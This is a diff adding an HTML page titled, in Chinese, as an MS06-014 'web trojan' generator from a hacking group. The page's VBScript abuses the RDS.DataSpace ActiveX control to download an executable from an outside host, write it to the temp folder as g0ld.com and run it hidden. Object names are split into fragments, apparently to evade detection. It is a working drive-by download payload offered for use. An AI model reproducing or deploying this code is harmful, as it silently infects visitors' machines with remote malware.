@@ -1,0 +1,48 @@
+<html>
+ <script language="VBScript">
+    aeiq="Mi"
+    cfpy="cr"
+    fgsg="os"
+    lima="of"
+    bypz="t."
+    mbhi="XM"
+    pmzk="LH"
+    zqqi="TT"
+    wivb="P"
+    on error resume next
+
+    dl = "http://gg.free3.77169.net/qq.exe"
+Set df = document.createElement("object")
+    df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
+    str="Microsoft.XMLHTTP"
+    Set x = df.CreateObject(str,"")
+    a1="Ado"
+    a2="db."
+    a3="Str"
+    a4="eam"
+    str1=a1&a2&a3&a4
+    str5=str1
+    set S = df.createobject(str5,"")
+    S.type = 1
+    str6="GET"
+    x.Open str6, dl, False
+    x.Send
+    fname1="g0ld.com"
+    set F = df.createobject("Scripting.FileSystemObject","")
+    set tmp = F.GetSpecialFolder(2) 
+    fname1= F.BuildPath(tmp,fname1)
+    S.open
+    S.write x.responseBody
+    S.savetofile fname1,2
+    S.close
+    set Q = df.createobject("Shell.Application","")
+    Q.ShellExecute fname1,"","","open",0
+    </script>
+    <head>
+    
+
+    <title>狼客基地专用MS06014网马生成 QQ:281886256</title>
+    </head><body>
+    <center>如果不想让内容显示就请把这些文字给删除！谢谢支持狼客基地<br>主页http://www.langhack.com 论坛http://bbs.langhack.com</center>
+    </body></html>
+
